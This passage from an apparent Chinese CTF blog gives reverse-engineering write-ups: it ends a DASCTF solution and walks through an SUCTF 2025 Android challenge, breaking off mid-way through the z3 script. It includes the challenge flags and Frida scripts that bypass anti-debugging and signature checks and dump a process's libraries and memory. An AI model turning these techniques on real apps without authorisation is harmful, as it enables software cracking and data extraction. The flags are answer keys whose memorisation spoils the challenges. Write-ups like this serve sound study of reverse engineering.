SYM:\"{mem;1@61F726}\": \"{rax}\"ret                               \n\n然后在flag输入处输入全可打印字符\n0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~\n\n提取出对应表\n{2596959767: '!', 3278025627: '\"', 1199340385: '#', 3652842418: '$', 3416942461: '%', 723666731: '&amp;', 280982008: \"'\", 3348210159: '(', 1029965590: ')', 1646217348: '*', 1509106344: '+', 1884266855: ',', 3998543758: '-', 10365811: '.', 3246951466: '/', 4064760690: '0', 3927678806: '1', 2190005025: '2', 2634537178: '3', 3418004561: '4', 3079324391: '5', 3488570123: '6', 1172465224: '7', 2466981603: '8', 3694201399: '9', 1612783687: ':', 693140910: ';', 3726077530: '&lt;', 1307370518: '=', 726644641: '&gt;', 1786144152: '?', 2537538325: '@', 390553811: 'A', 934768147: 'B', 831843374: 'C', 2228983316: 'D', 3114100952: 'E', 1105125222: 'F', 2398680771: 'G', 3353174339: 'H', 3250317036: 'I', 870428025: 'J', 3051147020: 'K', 120575263: 'L', 1208782285: 'M', 2708701790: 'N', 84861922: 'O', 2027386979: 'P', 1073431481: 'Q', 867118355: 'R', 2059931180: 'S', 1889880515: 'T', 4144402592: 'U', 157475374: 'V', 3597550946: 'W', 3904163235: 'X', 3052880830: 'Y', 1826329493: 'Z', 3635011357: '[', 2712232590: '\\\\', 2987677768: ']', 2851724154: '^', 2131826772: '_', 2472816263: '`', 291415938: 'a', 1891737825: 'b', 4106698431: 'c', 51373921: 'd', 3596199336: 'e', 86081972: 'f', 429896102: 'g', 1213478405: 'h', 1178941954: 'i', 2136545382: 'j', 1319470528: 'k', 2682404089: 'l', 2376513170: 'm', 3465855092: 'n', 1867828354: 'o', 2685652659: 'p', 1457933662: 'q', 3227490855: 'r', 3060405360: 's', 1697040329: 't', 294797628: 'u', 2577271396: 'v', 1420360541: 'w', 260209567: 'x', 2851528244: 'y', 2240464916: 'z', 2137638942: '{', 808490953: '|', 2884595695: '}', 3702355519: '~'}\n\n然后一一查询，就可以得到flag DASCTF{BBFE6A51-AE09-BCB1-E153-F2A3A297F228}\n","tags":["Reverse"]},{"title":"2025 SUCTF - Reverse 全题解","url":"/2025/01/14/2025suctf/","content":"2025 SUCTF Reverse Write UP\n\n\nSU_APP为什么我的安卓12跑不了这个app…，第一步刷机，降级安卓11，先patch一下so，去掉里面的一系列反调试\n干掉签名检验\n\n干掉两个线程反调试\n\n\n\n\n然后就可以 frida spawn 了，外层的 so 是一个加载器，先用 frida dump 出运行后的 so\ndump so 脚本var dump_so_func = function (soname, packageName) {    var module = Process.getModuleByName(soname);    var buffer = module.base.readByteArray(module.size);    console.log(`base: ${module.base}`);        const fileName = `/data/data/${packageName}/dump_so_${Date.now()}.so`;    const file = new File(fileName, \"wb\");    file.write(buffer);    file.flush();    file.close();        console.log(`[+] Saved ${soname} to file: ${fileName}`);    console.log(`[+] Bytecode size: ${module.size} bytes`);};function start_dump() {    var so_name = \"libsuapp.so\"    var package_name = \"com.swdd.suapp\"    dump_so_func(so_name, package_name)}\n\ndump 出来后发现前 128 个字节是坏的\n\n为了解决这个 我先尝试 dump 出 app 的整个内存，然后搜索 SUCTF{You_Find_Me}\ndump memory 脚本Java.perform(function() {    setTimeout(function() {        let allMemoryData = [];        let totalSize = 0;                const ranges = Process.enumerateRangesSync({            protection: '---',            coalesce: true        });                for (const range of ranges) {            try {                const current = range.base;                const size = range.size;                console.log(current, size)                const memoryData = Memory.readByteArray(current, size);                if (memoryData) {                    allMemoryData.push(memoryData);                    totalSize += size;                }            } catch {}        }        const finalBuffer = new ArrayBuffer(totalSize);        const finalArray = new Uint8Array(finalBuffer);        let offset = 0;                for (const data of allMemoryData) {            const tempArray = new Uint8Array(data);            finalArray.set(tempArray, offset);            offset += tempArray.length;        }                const timestamp = new Date().getTime();        const filename = `/data/data/com.swdd.suapp/memory_dump_${timestamp}.bin`;        const file = new File(filename, \"wb\");        file.write(finalBuffer);        file.flush();        file.close();        console.log(`[+] Saved ${finalBuffer.byteLength} bytes to ${filename}`);    }, 3000)})\n\n搜索到两个结果，其中一个结果只有前 64 个字节被抹了，接下来把这里未被覆盖的后64字节加上 apk 里的那个 so 加载器的前 64 个字节覆盖进dump出来的so，然后修复一下 so 就可以还原了\n\n找到主函数，简单重命名一下函数名和字段名后可以发现，这是利用了 libffi 库，根据 rc4 加密的前半步骤选取用于加密的函数，然后用 ffi_call 调用，一共有 256 种加密函数 每个加密函数有不同的参数个数，在调用前使用 j_ffi_prep_cif 预包装好参数\n\n\n\n由于加密过程和输入无关，可以用 frida 在五个参数运算完成后的位置 hook ，然后读出上面的 v20, v19, v18, v9, v8 这几个参数，再用 idapython 批量获取加密函数的伪代码，然后用脚本生成 z3 的约束条件去解\nhook 运算步骤脚本var inter = setInterval(() =&gt; {    try {        var proc = Process.findModuleByName(\"libsuapp.so\")        // fake so        if (proc.size &gt; 300000) return;        Interceptor.attach(proc.base.add(0x9D14), {            onEnter: function() {                var sp = this.context.sp                var v20 = sp.add(0x90).readU32()                var v19 = sp.add(0x8c).readU32()                var v18 = sp.add(0x88).readU32()                var v9 = sp.add(0x28).readU32()                var v8 = sp.add(0x24).readU32()                var v7 = sp.add(0x20).readU32()                var callFunc = sp.add(0x70).readPointer().sub(proc.base)                var callType = sp.add(0x14).readU32()                console.log(`${callFunc}-${callType}, ${v20}, ${v19}, ${v18}, ${v9}, ${v8}, ${v7}`)                // console.log(hexdump(proc.base.add(0x22868), { length:  128, ansi: true}))            }        })        clearInterval(inter)        console.log(\"Hooked!\")    } catch {}}, 10) \n\n\n得到运算步骤后生成 z3 约束条件\n条件生成脚本import rewith open(\"ezapp\\\\execute_route.txt\", \"r\") as f:    data = f.read()    f.close()    with open(\"ezapp\\\\functions_pseudocode.txt\", \"r\") as f:    fake_c_data = f.read()    f.close()code_map = {}for fake in fake_c_data.split(\"\\n\\n\\n\"):    if fake.strip() == \"\":        continue    addr = re.findall(r\"// Function at (.*)\", fake)[0]    code = re.findall(r\"return (.*);\", fake)[0]        code = code.replace(\"(unsigned int)\", \"\")        code_map[addr] = code        # print(code)    func_map = {}for line in data.split(\"\\n\"):    dts = line.split(', ')    func = dts[0].split(\"-\")[0]    args = int(dts[0].split(\"-\")[1])        if func not in func_map:        func_map[func] = True        # print(func)        v20 = dts[1]    v19 = dts[2]    v18 = dts[3]        v9 = dts[4]    v8 = dts[5]        code = code_map[func]        if args == 3:        code = code.replace(\"a1\", v20)        code = code.replace(\"a2\", v19)        code = code.replace(\"a3\", v18)                code = code.replace(\"a4\", f\"flag[{v9}]\")        code = code.replace(\"a5\", f\"flag[{v8}]\")    elif args == 2:        code = code.replace(\"a1\", v20)        code = code.replace(\"a2\", v19)                code = code.replace(\"a3\", f\"flag[{v9}]\")        code = code.replace(\"a4\", f\"flag[{v8}]\")    elif args == 1:        code = code.replace(\"a1\", v20)                code = code.replace(\"a2\", f\"flag[{v9}]\")        code = code.replace(\"a3\", f\"flag[{v8}]\")        print(f\"flag[{v9}] = {code}\")    '''flag[11] = (197 + flag[11] + flag[15] + 209)flag[25] = ((86 + flag[25]) ^ flag[4]) + 73flag[6] = (148 ^ (131 + flag[6]) ^ flag[12]) + 158flag[19] = (144 + flag[19] + flag[23] + 225)flag[10] = (179 + flag[10] + flag[23] + 62)flag[23] = (187 ^ 121 ^ flag[23] ^ flag[16]) + 180flag[12] = (58 ^ (213 + flag[12] + flag[23])) + 174flag[21] = (95 + flag[8] + flag[21])flag[1] = (126 + flag[19] + flag[1])flag[4] = ((219 + 9) ^ flag[4] ^ flag[17]) + 109flag[22] = (60 + flag[18] + flag[22])flag[14] = (109 + flag[14] + flag[30] + 238)flag[18] = (72 ^ flag[20]) + flag[18]flag[15] = (10 + 146 + flag[15] + flag[24] + 45)flag[19] = (23 ^ flag[19] ^ flag[14]) + 51flag[14] = (140 ^ (flag[14] + flag[20])) + 155flag[21] = (89 ^ flag[21] ^ flag[13]) + 209flag[21] = (187 + flag[21] + flag[19] + 168)flag[8] = (47 + flag[8] + flag[22] + 229)flag[4] = (159 ^ (flag[4] + flag[12])) + 248flag[29] = (27 ^ (255 + flag[29] + flag[19])) + 137flag[7] = (93 + flag[16] + flag[7])flag[4] = (206 ^ (188 + flag[4]) ^ flag[12]) + 11flag[8] = ((33 + flag[8]) ^ flag[7]) + 141flag[24] = (178 + flag[11] + flag[24])flag[13] = (35 + flag[8] + flag[13])flag[19] = (215 + 230 + flag[19] + flag[23] + 169)flag[5] = (201 + flag[27] + flag[5])flag[28] = (107 + flag[19] + flag[28])flag[26] = ((111 + 48) ^ flag[26] ^ flag[28]) + 196flag[12] = (132 ^ flag[28]) + flag[12]flag[0] = (163 ^ flag[3]) + flag[0]flag[16] = (117 + flag[3] + flag[16])flag[0] = (84 ^ flag[0] ^ flag[24]) + 217flag[19] = (211 ^ (68 + flag[19]) ^ flag[29]) + 217flag[24] = (29 + flag[13] + flag[24])flag[14] = (228 + 117 + flag[14] + flag[28] + 37)flag[9] = ((208 + 141 + flag[9]) ^ flag[22]) + 62flag[30] = (202 + flag[30] + flag[27] + 90)flag[20] = (0 ^ flag[8]) + flag[20]flag[28] = (57 ^ (flag[28] + flag[1])) + 129flag[15] = (210 + flag[28] + flag[15])flag[14] = ((79 + 85 + flag[14]) ^ flag[10]) + 177flag[17] = (123 + flag[23] + flag[17])flag[30] = (146 + flag[30] + flag[18] + 255)flag[25] = (84 + flag[25] + flag[1] + 120)flag[20] = ((55 + 1 + flag[20]) ^ flag[15]) + 102flag[6] = ((154 + flag[6]) ^ flag[23]) + 169flag[5] = (15 ^ (flag[5] + flag[31])) + 104flag[1] = (250 ^ flag[4]) + flag[1]flag[18] = (255 + flag[18] + flag[8] + 177)flag[15] = (249 + 101 + flag[15] + flag[21] + 168)flag[0] = ((218 + 152) ^ (flag[0] + flag[30])) + 128flag[5] = (94 + flag[18] + flag[5])flag[9] = (98 ^ flag[0]) + flag[9]flag[15] = (166 ^ (65 + flag[15] + flag[5])) + 46flag[26] = (206 + flag[8] + flag[26])flag[20] = (104 + flag[4] + flag[20])flag[23] = (144 + flag[4] + flag[23])flag[31] = (202 + flag[23] + flag[31])flag[28] = (160 + flag[20] + flag[28])flag[5] = (94 + 60 + flag[5] + flag[23] + 235)flag[26] = (50 + flag[26] + flag[3] + 253)flag[6] = ((149 + flag[6]) ^ flag[17]) + 19flag[31] = (34 + flag[31] + flag[7] + 198)flag[18] = (35 ^ flag[18] ^ flag[20]) + 249flag[26] = (65 + flag[17] + flag[26])flag[10] = (237 + flag[10] + flag[11] + 142)flag[25] = (7 + 247 + flag[25] + flag[24] + 167)flag[3] = (22 ^ flag[3] ^ flag[17]) + 190flag[16] = (234 + flag[25] + flag[16])flag[29] = (231 + 172 + flag[29] + flag[7] + 9)flag[1] = (230 ^ flag[5]) + flag[1]flag[2] = (51 + 152 + flag[2] + flag[4] + 55)flag[17] = (252 + flag[17] + flag[3] + 161)flag[17] = ((119 + flag[17]) ^ flag[11]) + 212flag[30] = (88 ^ flag[30] ^ flag[9]) + 72flag[8] = (30 + flag[8] + flag[10] + 38)flag[19] = ((229 + flag[19]) ^ flag[14]) + 3flag[5] = ((45 + 241) ^ (flag[5] + flag[18])) + 60flag[25] = (197 + flag[25] + flag[14] + 244)flag[30] = (241 + flag[30] + flag[18] + 231)flag[8] = (138 ^ 226 ^ flag[8] ^ flag[31]) + 185flag[18] = ((154 + 7 + flag[18]) ^ flag[9]) + 183flag[2] = (138 ^ flag[17]) + flag[2]flag[17] = (173 + flag[12] + flag[17])flag[9] = ((111 + 86 + flag[9]) ^ flag[26]) + 151flag[30] = (100 + 148 + flag[30] + flag[3] + 170)flag[1] = (12 ^ flag[19]) + flag[1]flag[30] = (215 + flag[12] + flag[30])flag[20] = (151 ^ flag[25]) + flag[20]flag[14] = (144 + flag[14] + flag[21] + 41)flag[24] = (23 ^ (flag[24] + flag[12])) + 86flag[0] = (168 ^ flag[29]) + flag[0]flag[13] = (83 + flag[9] + flag[13])flag[7] = (177 ^ (flag[7] + flag[4])) + 83flag[14] = (146 ^ (flag[14] + flag[9])) + 173flag[27] = (30 ^ (72 + flag[27] + flag[8])) + 2flag[13] = (148 + flag[18] + flag[13])flag[19] = (152 + flag[9] + flag[19])flag[27] = (238 ^ (140 + flag[27] + flag[14])) + 50flag[17] = (148 ^ flag[25]) + flag[17]flag[8] = (77 ^ flag[20]) + flag[8]flag[5] = (19 ^ (47 + flag[5] + flag[17])) + 238flag[24] = (182 + flag[14] + flag[24])flag[9] = (172 ^ (27 + flag[9]) ^ flag[31]) + 210flag[6] = (211 ^ flag[2]) + flag[6]flag[11] = (80 ^ flag[28]) + flag[11]flag[13] = (12 ^ 33 ^ (flag[13] + flag[5])) + 61flag[22] = (231 ^ (178 + flag[22] + flag[8])) + 197flag[1] = (203 + flag[13] + flag[1])flag[9] = (72 ^ (215 + flag[9] + flag[6])) + 116flag[30] = (183 + flag[14] + flag[30])flag[25] = (27 + 107 + flag[25] + flag[4] + 100)flag[4] = (19 ^ (111 + flag[4]) ^ flag[16]) + 235flag[5] = (220 ^ flag[15]) + flag[5]flag[24] = ((60 + 163) ^ (flag[24] + flag[0])) + 164flag[27] = ((99 + flag[27]) ^ flag[7]) + 25flag[25] = (163 + flag[28] + flag[25])flag[25] = (24 ^ (flag[25] + flag[4])) + 54flag[10] = ((189 + 29 + flag[10]) ^ flag[16]) + 214flag[5] = (13 + flag[5] + flag[21] + 160)flag[30] = (92 ^ (208 + flag[30]) ^ flag[13]) + 189flag[26] = (246 ^ flag[26] ^ flag[15]) + 93flag[30] = ((59 + 0 + flag[30]) ^ flag[7]) + 72flag[1] = (136 ^ (flag[1] + flag[9])) + 111flag[25] = (65 ^ (flag[25] + flag[0])) + 98flag[17] = (92 + flag[21] + flag[17])flag[15] = (42 ^ (flag[15] + flag[17])) + 1flag[31] = (183 ^ flag[4]) + flag[31]flag[24] = (242 + flag[24] + flag[18] + 28)flag[6] = (1 + flag[1] + flag[6])flag[9] = (15 ^ 154 ^ (flag[9] + flag[10])) + 152flag[8] = (55 ^ flag[2]) + flag[8]flag[29] = (255 + 250 + flag[29] + flag[23] + 46)flag[17] = (68 ^ (flag[17] + flag[22])) + 165flag[8] = ((104 + 249 + flag[8]) ^ flag[5]) + 0flag[0] = (53 + flag[0] + flag[24] + 224)flag[17] = (222 ^ flag[1]) + flag[17]flag[10] = ((82 + 98) ^ flag[10] ^ flag[2]) + 180flag[14] = (128 ^ (166 + flag[14] + flag[1])) + 25flag[0] = (165 ^ flag[29]) + flag[0]flag[13] = (72 + flag[15] + flag[13])flag[19] = (36 + flag[19] + flag[30] + 59)flag[17] = (196 + flag[9] + flag[17])flag[17] = (183 + 160 + flag[17] + flag[4] + 96)flag[11] = (244 + flag[28] + flag[11])flag[29] = (87 + flag[29] + flag[30] + 189)flag[19] = (99 + 149 + flag[19] + flag[0] + 162)flag[6] = (177 + flag[3] + flag[6])flag[25] = (103 ^ (flag[25] + flag[30])) + 162flag[29] = (148 + flag[29] + flag[13] + 8)flag[14] = ((241 + flag[14]) ^ flag[15]) + 17flag[7] = (139 + flag[23] + flag[7])flag[30] = (152 + flag[9] + flag[30])flag[23] = (113 + flag[23] + flag[4] + 54)flag[9] = ((89 + flag[9]) ^ flag[12]) + 79flag[19] = (39 + 230 + flag[19] + flag[27] + 189)flag[23] = ((37 + 51 + flag[23]) ^ flag[24]) + 147flag[1] = (196 + 252 + flag[1] + flag[4] + 224)flag[20] = (67 + flag[2] + flag[20])flag[8] = (43 ^ flag[13]) + flag[8]flag[6] = (137 ^ 30 ^ (flag[6] + flag[7])) + 54flag[3] = (74 ^ flag[22]) + flag[3]flag[28] = (110 + flag[17] + flag[28])flag[20] = ((178 + 197 + flag[20]) ^ flag[9]) + 141flag[7] = (142 ^ (flag[7] + flag[10])) + 230flag[25] = (82 ^ flag[25] ^ flag[2]) + 242flag[23] = (191 ^ flag[23] ^ flag[7]) + 201flag[11] = (137 + flag[11] + flag[18] + 34)flag[8] = (49 + 173 + flag[8] + flag[5] + 117)flag[23] = (172 + 111 + flag[23] + flag[22] + 235)flag[10] = (250 + flag[20] + flag[10])flag[27] = (131 + 12 + flag[27] + flag[16] + 38)flag[28] = (179 + flag[28] + flag[19] + 115)flag[23] = (108 + flag[27] + flag[23])flag[9] = (121 ^ 144 ^ (flag[9] + flag[26])) + 23flag[22] = ((213 + 23 + flag[22]) ^ flag[31]) + 108flag[0] = ((140 + 168) ^ (flag[0] + flag[30])) + 85flag[19] = ((125 + 83) ^ (flag[19] + flag[27])) + 129flag[19] = (9 + flag[28] + flag[19])flag[13] = (228 + flag[13] + flag[13] + 182)flag[2] = (105 + flag[8] + flag[2])flag[30] = (40 ^ flag[10]) + flag[30]flag[28] = (146 ^ (flag[28] + flag[23])) + 143flag[18] = ((201 + 238 + flag[18]) ^ flag[12]) + 211flag[19] = (78 + 148 + flag[19] + flag[25] + 110)flag[18] = (57 + flag[27] + flag[18])flag[14] = (180 + flag[15] + flag[14])flag[25] = ((177 + flag[25]) ^ flag[31]) + 104flag[18] = (46 ^ (172 + flag[18]) ^ flag[27]) + 100flag[14] = (255 ^ flag[14] ^ flag[29]) + 61flag[8] = (226 + flag[8] + flag[14] + 103)flag[29] = ((188 + 12) ^ (flag[29] + flag[1])) + 164flag[5] = (229 ^ flag[18]) + flag[5]flag[2] = (8 + flag[2] + flag[3] + 184)flag[20] = (45 + flag[23] + flag[20])flag[6] = (230 ^ flag[6] ^ flag[9]) + 243flag[4] = (174 + flag[4] + flag[11] + 101)flag[11] = (68 + 19 + flag[11] + flag[15] + 124)flag[11] = (48 + flag[4] + flag[11])flag[4] = ((111 + 60 + flag[4]) ^ flag[3]) + 172flag[25] = (192 ^ (99 + flag[25] + flag[21])) + 128flag[3] = ((167 + 163 + flag[3]) ^ flag[20]) + 48flag[22] = ((28 + 24 + flag[22]) ^ flag[19]) + 160flag[22] = (68 + 189 + flag[22] + flag[29] + 51)flag[0] = (80 + flag[4] + flag[0])flag[29] = (117 + flag[29] + flag[16] + 142)flag[29] = (141 + flag[29] + flag[10] + 137)flag[8] = (175 ^ flag[8] ^ flag[0]) + 126flag[15] = (7 ^ flag[25]) + flag[15]flag[2] = ((105 + 65 + flag[2]) ^ flag[18]) + 60flag[4] = (96 ^ (flag[4] + flag[15])) + 47flag[1] = (85 ^ flag[27]) + flag[1]flag[11] = (81 + 183 + flag[11] + flag[18] + 177)flag[28] = ((228 + flag[28]) ^ flag[20]) + 254flag[23] = (50 ^ (1 + flag[23]) ^ flag[23]) + 57flag[24] = (1 + flag[26] + flag[24])flag[28] = (10 ^ (55 + flag[28] + flag[15])) + 134flag[14] = (98 + flag[14] + flag[26] + 165)flag[5] = (215 ^ (flag[5] + flag[31])) + 225flag[0] = (86 + flag[25] + flag[0])flag[0] = ((101 + 53) ^ (flag[0] + flag[26])) + 207flag[31] = (152 ^ flag[30]) + flag[31]flag[20] = ((65 + flag[20]) ^ flag[2]) + 69flag[25] = (194 ^ (flag[25] + flag[6])) + 105flag[19] = (65 ^ flag[14]) + flag[19]flag[11] = (29 ^ flag[8]) + flag[11]flag[27] = (175 ^ flag[16]) + flag[27]flag[8] = (254 + flag[8] + flag[10] + 215)flag[0] = (201 ^ flag[0]) + flag[0]flag[18] = (68 + flag[30] + flag[18])flag[29] = ((60 + flag[29]) ^ flag[18]) + 101flag[2] = (190 + flag[21] + flag[2])flag[11] = (128 ^ flag[11] ^ flag[2]) + 38flag[2] = (195 + flag[3] + flag[2])flag[8] = ((222 + flag[8]) ^ flag[1]) + 210flag[17] = (109 + flag[17] + flag[13] + 90)flag[28] = (143 + flag[7] + flag[28])flag[4] = (247 ^ (152 + flag[4]) ^ flag[22]) + 249flag[22] = ((233 + flag[22]) ^ flag[10]) + 163flag[15] = (132 ^ flag[7]) + flag[15]flag[29] = (172 + flag[6] + flag[29])flag[19] = ((123 + flag[19]) ^ flag[19]) + 225flag[0] = (152 + flag[0] + flag[28] + 34)flag[10] = (68 + flag[23] + flag[10])flag[23] = (130 + flag[23] + flag[24] + 17)flag[22] = (141 + 137 + flag[22] + flag[30] + 254)flag[8] = (71 + 74 + flag[8] + flag[5] + 232)flag[9] = (118 ^ (flag[9] + flag[13])) + 115flag[13] = (241 + flag[13] + flag[5] + 101)flag[6] = ((73 + 142) ^ (flag[6] + flag[17])) + 217flag[18] = (202 + flag[18] + flag[10] + 222)flag[9] = (226 + flag[9] + flag[26] + 8)flag[2] = (7 + flag[10] + flag[2])flag[21] = (114 + flag[13] + flag[21])'''\n\n获取伪代码的 idapython 脚本import idaapiimport idautilsimport idcdef get_pseudocode(func_addr):    try:        decompilation = idaapi.decompile(func_addr)        if decompilation:            return str(decompilation)        else:            return None    except idaapi.DecompilationFailure:        print(f\"[!] Failed to decompile function at {hex(func_addr)}\")        return Nonefunc_addresses = [    0xc7b4,    0xcc38,    0xb8f0,    0xa900,    0xac10,    0xb798,    0xca0c,    0xa6cc,    0xb6c0,    0xccec,    0xa2b0,    0xe180,    0xd900,    0xae5c,    0xae9c,    0xdd98,    0xb01c,    0xd668,    0xbdb0,    0xcbd0,    0xb11c,    0xd2f8,    0xd244,    0xbf0c,    0xab38,    0xbb30,    0xdcd8,    0xb4c0,    0xcaf4,    0xa840,    0xdaf0,    0xaf68,    0xd75c,    0xd0f8,    0xb970,    0xb3f4,    0xbdfc,    0xbabc,    0xb2f4,    0xa264,    0xc4cc,    0xcf60,    0xc7f4,    0xe100,    0xad50,    0xcb28,    0xa224,    0xda18,    0xb9fc,    0xceac,    0xce60,    0xbcf0,    0xb0a8,    0xba48,    0xbea4,    0xca80,    0xcc78,    0xa43c,    0xa64c,    0xc2f4,    0xb5c0,    0xc6d8,    0xb480,    0xafa8,    0xdc64,    0xc54c,    0xdb8c,    0xde98,    0xd404,    0xaa50,    0xbf40,    0xd834,    0xbed8,    0xc498,    0xa7c0,    0xbd24,    0xb758,    0xc240,    0xcf20,    0xc68c,    0xc5d8,    0xd6a8,    0xc74c,    0xbc18,    0xbbe4,    0xc400,    0xcfa0,    0xd510,    0xded8,    0xbb64,    0xc0e8,    0xd02c,    0xccb8,    0xc1f4,    0xadd0,    0xc598,    0xc44c,    0xc174,    0xb70c,    0xb0dc,    0xad90,    0xb58c,    0xcdec,    0xd6dc,    0xc380,    0xda64,    0xd590,    0xb328,    0xbc64,    0xddd8,    0xe098,    0xd7a8,    0xd190,    0xc074,    0xc9d8,    0xb8b0,    0xbcb0,    0xe064,    0xcac0,    0xc60c,    0xe140,    0xd61c,    0xdc18,    0xd98c,    0xb434,    0xc9a4,    0xb168,    0xcd20,    0xbd64,    0xcb9c,    0xc0b4,    0xad1c,    0xc8d8,    0xdb58,    0xe024,    0xd338,    0xa4e4,    0xc780,    0xba7c,    0xcc04,    0xcfec,    0xd2ac,    0xa8b4,    0xac5c,    0xab04,    0xcd6c,    0xe1b4,    0xbff4,    0xbb98,    0xc134,    0xde64,    0xa9e8,    0xb634,    0xd144,    0xbfb4,    0xa47c,    0xca40,    0xa2f0,    0xdf24,    0xdbcc]output_file = \"functions_pseudocode.txt\"with open(output_file, \"w\", encoding=\"utf-8\") as f:    for func_addr in func_addresses:        if not idc.get_func_name(func_addr):            print(f\"[!] No function found at {hex(func_addr)}\")            continue        print(f\"[+] Processing function at {hex(func_addr)}\")        pseudocode = get_pseudocode(func_addr)        if pseudocode:            f.write(f\"// Function at {hex(func_addr)}\\n\")            f.write(f\"{pseudocode}\\n\\n\")        else:            f.write(f\"// Failed to decompile function at {hex(func_addr)}\\n\\n\")print(f\"[+] Pseudocode saved to {output_file}\")\n\nz3 脚本from z3 import *s = Solver()flag = [BitVec(f\"f_{_}\", 16) for _ in range(32)]for i in range(32):    s.add(And(flag[i] &gt;= 0, flag[i] &lt;= 255))s.add(flag[0] == ord('S'))s.add(flag[1] == ord('U'))s.add(flag[2] == ord('C'))s.add(flag[3] == ord('T'))s.add(flag[4] == ord('F'))mw = [0x000D7765, 0x00011EBD, 0x00032D12, 0x00013778, 0x0008A428, 0x0000B592, 0x0003FA57, 0x00001616, 0x0003659E, 0x0002483A, 0x00002882, 0x000508F4, 0x00000BAD, 0x00027920, 0x0000F821, 0x00019F83, 0x00000F97, 0x00033904, 0x000170D5, 0x0000016C, 0x0000CF5D, 0x000280D2, 0x000A8ADE, 0x00009EAA, 0x00009DAB, 0x0001F45E, 0x00003214, 0x000052FA, 0x0006D57A, 0x000460ED, 0x000124FF, 0x00013936]flag[11] = (197 + flag[11] + flag[15] + 209)flag[25] = ((86 + flag[25]) ^ flag[4]) + 73flag[6] = (148 ^ (131 + flag[6]) ^ flag[12]) + 158flag[19] = (144 + flag[19] + flag[23] + 225)flag[10] = (179 + flag[10] + flag[23] + 62)flag[23] = (187 ^ 121 ^ flag[23] ^ flag[16]) + 180flag[12] = (58 ^ (213 + flag[12] + flag[23])) + 174flag[21] = (95 + flag[8] + flag[21])flag[1] = (126 + flag[19] + flag[1])flag[4] = ((219 + 9) ^ flag[4] ^ flag[17]) + 109flag[22] = (60 + flag[18] + flag[22])flag[14] = (109 + flag[14] + flag[30] + 238)flag[18] = (72 ^ flag[20]) + flag[18]flag[15] = (10 + 146 + flag[15] + flag[24] + 45)flag[19] = (23 ^ flag[19] ^ flag[14]) + 51flag[14] = (140 ^ (flag[14] + flag[20])) + 155flag[21] = (89 ^ flag[21] ^ flag[13]) + 209flag[21] = (187 + flag[21] + flag[19] + 168)flag[8] = (47 + flag[8] + flag[22] + 229)flag[4] = (159 ^ (flag[4] + flag[12])) + 248flag[29] = (27 ^ (255 + flag[29] + flag[19])) + 137flag[7] = (93 + flag[16] + flag[7])flag[4] = (206 ^ (188 + flag[4]) ^ flag[12]) + 11flag[8] = ((33 + flag[8]) ^ flag[7]) + 141flag[24] = (178 + flag[11] + flag[24])flag[13] = (35 + flag[8] + flag[13])flag[19] = (215 + 230 + flag[19] + flag[23] + 169)flag[5] = (201 + flag[27] + flag[5])flag[28] = (107 + flag[19] + flag[28])flag[26] = ((111 + 48) ^ flag[26] ^ flag[28]) + 196flag[12] = (132 ^ flag[28]) + flag[12]flag[0] = (163 ^ flag[3]) + flag[0]flag[16] = (117 + flag[3] + flag[16])flag[0] = (84 ^ flag[0] ^ flag[24]) + 217flag[19] = (211 ^ (68 + flag[19]) ^ flag[29]) + 217flag[24] = (29 + flag[13] + flag[24])flag[14] = (228 + 117 + flag[14] + flag[28] + 37)flag[9] = ((208 + 141 + flag[9]) ^ flag[22]) + 62flag[30] = (202 + flag[30] + flag[27] + 90)flag[20] = (0 ^ flag[8]) + flag[20]flag[28] = (57 ^ (flag[28] + flag[1])) + 129flag[15] = (210 + flag[28] + flag[15])flag[14] = ((79 + 85 + flag[14]) ^ flag[10]) + 177flag[17] = (123 + flag[23] + flag[17])flag[30] = (146 + flag[30] + flag[18] + 255)flag[25] = (84 + flag[25] + flag[1] + 120)flag[20] = ((55 + 1 + flag[20]) ^ flag[15]) + 102flag[6] = ((154 + flag[6]) ^ flag[23]) + 169flag[5] = (15 ^ (flag[5] + flag[31])) + 104flag[1] = (250 ^ flag[4]) + flag[1]flag[18] = (255 + flag[18] + flag[8] + 177)flag[15] = (249 + 101 + flag[15] + flag[21] + 168)flag[0] = ((218 + 152) ^ (flag[0] + flag[30])) + 128flag[5] = (94 + flag[18] + flag[5])flag[9] = (98 ^ flag[0]) + flag[9]flag[15] = (166 ^ (65 + flag[15] + flag[5])) + 46flag[26] = (206 + flag[8] + flag[26])flag[20] = (104 + flag[4] + flag[20])flag[23] = (144 + flag[4] + flag[23])flag[31] = (202 + flag[23] + flag[31])flag[28] = (160 + flag[20] + flag[28])flag[5] = (94 + 60 + flag[5] + flag[23] + 235)flag[26] = (50 + flag[26] + flag[3] + 253)flag[6] = ((149 + flag[6]) ^ flag[17]) + 19flag[31] = (34 + flag[31] + flag[7] + 198)flag[18] = (35 ^ flag[18] ^ flag[20]) + 249flag[26] = (65 + flag[17] + flag[26])flag[10] = (237 + flag[10] + flag[11] + 142)flag[25] = (7 + 247 + flag[25] + flag[24] + 167)flag[3] = (22 ^ flag[3] ^ flag[17]) + 190flag[16] = (234 + flag[25] + flag[16])flag[29] = (231 + 172 + flag[29] + flag[7] + 9)flag[1] = (230 ^ flag[5]) + flag[1]flag[2] = (51 + 152 + flag[2] + flag[4] + 55)flag[17] = (252 + flag[17] + flag[3] + 161)flag[17] = ((119 + flag[17]) ^ flag[11]) + 212flag[30] = (88 ^ flag[30] ^ flag[9]) + 72flag[8] = (30 + flag[8] + flag[10] + 38)flag[19] = ((229 + flag[19]) ^ flag[14]) + 3flag[5] = ((45 + 241) ^ (flag[5] + flag[18])) + 60flag[25] = (197 + flag[25] + flag[14] + 244)flag[30] = (241 + flag[30] + flag[18] + 231)flag[8] = (138 ^ 226 ^ flag[8] ^ flag[31]) + 185flag[18] = ((154 + 7 + flag[18]) ^ flag[9]) + 183flag[2] = (138 ^ flag[17]) + flag[2]flag[17] = (173 + flag[12] + flag[17])flag[9] = ((111 + 86 + flag[9]) ^ flag[26]) + 151flag[30] = (100 + 148 + flag[30] + flag[3] + 170)flag[1] = (12 ^ flag[19]) + flag[1]flag[30] = (215 + flag[12] + flag[30])flag[20] = (151 ^ flag[25]) + flag[20]flag[14] = (144 + flag[14] + flag[21] + 41)flag[24] = (23 ^ (flag[24] + flag[12])) + 86flag[0] = (168 ^ flag[29]) + flag[0]flag[13] = (83 + flag[9] + flag[13])flag[7] = (177 ^ (flag[7] + flag[4])) + 83flag[14] = (146 ^ (flag[14] + flag[9])) + 173flag[27] = (30 ^ (72 + flag[27] + flag[8])) + 